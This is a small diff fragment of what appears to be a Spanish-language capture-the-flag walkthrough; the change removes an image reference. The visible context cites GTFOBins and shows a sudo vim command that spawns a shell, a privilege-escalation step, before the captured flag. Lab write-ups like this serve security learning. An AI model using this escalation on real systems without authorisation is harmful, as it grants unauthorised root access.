@@ -122,9 +122,6 @@ De acuerdo con las técnicas de evasión documentadas en GTFOBins, los editores 
 ```
 sudo /usr/bin/vim -c ':!/bin/sh'
 ```
-
-![7](images/7.png)
-
 Bandera capturada:
 
 ```
